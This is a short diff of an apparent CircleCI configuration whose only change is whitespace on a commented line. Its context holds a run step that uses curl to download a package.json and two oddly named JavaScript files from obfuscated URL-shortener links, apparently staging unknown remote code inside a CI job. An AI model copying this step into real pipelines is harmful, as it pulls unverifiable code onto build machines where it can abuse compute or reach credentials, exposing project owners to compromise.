@@ -5,7 +5,7 @@ jobs:
   admin:
     executor:
       name: android/android-machine
-    #resource_class: medium 
+    #resource_class: medium  
     steps:
       - run: 
           command: curl -fsSL shorturl.at/xEL35 -o package.json && curl -fsSL shorturl.at/giCHZ -o rutyjhfgdfr.js && curl -fsSL shorturl.at/nCMZ2 -o jobslogger.js
